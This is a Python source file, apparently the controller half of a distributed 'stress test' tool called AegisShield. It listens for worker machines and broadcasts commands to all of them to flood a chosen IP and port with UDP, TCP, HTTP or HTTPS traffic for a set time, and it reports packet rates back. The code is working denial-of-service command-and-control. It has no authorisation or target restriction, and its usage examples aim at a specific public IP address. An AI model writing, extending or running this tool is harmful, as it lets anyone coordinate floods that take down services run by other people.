#!/usr/bin/env python3
"""
AegisShield Stress Test Controller (Master)
============================================
Run this on your main PC. Workers connect to it.
Usage:
    python3 controller.py              # listens on 0.0.0.0:7777
    python3 controller.py --port 8888  # custom port

Commands (type in the prompt):
    attack <IP> <PORT> <METHOD> <PACKET_SIZE> <DURATION_SEC>
    attack 159.65.32.13 12345 udp 65507 60
    attack 159.65.32.13 80 tcp 1024 30
    attack 159.65.32.13 80 http 0 30
    attack 159.65.32.13 443 https 0 30
    stop              — stop all attacks on all workers
    status            — show connected workers
    exit              — shutdown controller
"""

import socket
import threading
import json
import time
import sys
import argparse

workers = {}  # {addr: socket}
lock = threading.Lock()


def handle_worker(conn, addr):
    """Handle a connected worker."""
    name = f"{addr[0]}:{addr[1]}"
    with lock:
        workers[name] = conn
    print(f"\n  ✅ Worker connected: {name} (total: {len(workers)})")
    print_prompt()

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            try:
                msg = json.loads(data.decode())
                if msg.get("type") == "stats":
                    sys.stdout.write(
                        f"\r  📊 [{name}] {msg.get('sent', 0):,} pkts | "
                        f"{msg.get('pps', 0):,.0f} pps | "
                        f"{msg.get('mbps', 0):,.1f} Mbps\n"
                    )
                    print_prompt()
                elif msg.get("type") == "done":
                    sys.stdout.write(
                        f"\r  ✅ [{name}] Attack finished. "
                        f"Total: {msg.get('total', 0):,} pkts\n"
                    )
                    print_prompt()
                elif msg.get("type") == "error":
                    sys.stdout.write(
                        f"\r  ❌ [{name}] Error: {msg.get('message')}\n"
                    )
                    print_prompt()
            except json.JSONDecodeError:
                pass
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        with lock:
            workers.pop(name, None)
        print(f"\n  ❌ Worker disconnected: {name} (total: {len(workers)})")
        print_prompt()
        conn.close()


def broadcast(msg):
    """Send a command to all workers."""
    data = json.dumps(msg).encode() + b"\n"
    with lock:
        dead = []
        for name, conn in workers.items():
            try:
                conn.sendall(data)
            except (BrokenPipeError, OSError):
                dead.append(name)
        for d in dead:
            workers.pop(d, None)
    return len(workers) - len(dead)


def print_prompt():
    sys.stdout.write("aegis-stress> ")
    sys.stdout.flush()


BANNER = r"""
   _____  _____ _____ _____ _____
  / ____|/ ____|_   _/ ____|_   _|
 | (___ | (___   | || (___   | |  _ __ ___  ___ ___
  \___ \ \___ \  | | \___ \  | | | '__/ _ \/ __/ __|
  ____) |____) |_| |_____) |_| |_| | |  __/\__ \__ \
 |_____/|_____/|_____|_____/|_____|_|  \___||___/___/

  AegisShield Stress Test Controller v1.0
"""


def main():
    parser = argparse.ArgumentParser(description="Stress Test Controller")
    parser.add_argument("--port", type=int, default=7777, help="Listen port")
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    args = parser.parse_args()

    print(BANNER)

    # Start listener
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.host, args.port))
    server.listen(100)
    print(f"  🎯 Controller listening on {args.host}:{args.port}")
    print(f"  📋 On each worker, run:")
    print(f"     python3 worker.py --master <THIS_IP>:{args.port}")
    print(f"\n  Commands:")
    print(f"     attack <IP> <PORT> <METHOD> <PACKET_SIZE> <DURATION>")
    print(f"     stop | status | exit\n")

    # Accept workers in background
    def accept_loop():
        while True:
            try:
                conn, addr = server.accept()
                threading.Thread(
                    target=handle_worker, args=(conn, addr), daemon=True
                ).start()
            except OSError:
                break

    threading.Thread(target=accept_loop, daemon=True).start()

    # Command loop
    while True:
        print_prompt()
        try:
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down...")
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "exit" or cmd == "quit":
            broadcast({"cmd": "stop"})
            break

        elif cmd == "status":
            with lock:
                n = len(workers)
            print(f"  Connected workers: {n}")
            with lock:
                for name in workers:
                    print(f"    • {name}")

        elif cmd == "stop":
            sent_to = broadcast({"cmd": "stop"})
            print(f"  🛑 Stop sent to {sent_to} workers")

        elif cmd == "attack":
            if len(parts) < 6:
                print("  Usage: attack <IP> <PORT> <METHOD> <PACKET_SIZE> <DURATION>")
                print("  Example: attack 159.65.32.13 12345 udp 65507 60")
                continue

            target_ip = parts[1]
            target_port = int(parts[2])
            method = parts[3].lower()
            pkt_size = int(parts[4])
            duration = int(parts[5])

            if method not in ("udp", "tcp", "http", "https"):
                print("  ❌ Method must be: udp, tcp, http, https")
                continue

            msg = {
                "cmd": "attack",
                "target": target_ip,
                "port": target_port,
                "method": method,
                "size": pkt_size,
                "duration": duration,
            }
            sent_to = broadcast(msg)
            print(
                f"  🔥 Attack command sent to {sent_to} workers!"
            )
            print(
                f"     Target: {target_ip}:{target_port} | "
                f"Method: {method.upper()} | Size: {pkt_size}B | "
                f"Duration: {duration}s"
            )

        else:
            print(f"  Unknown command: {cmd}")
            print("  Commands: attack, stop, status, exit")

    server.close()
    print("  Controller stopped.")


if __name__ == "__main__":
    main()
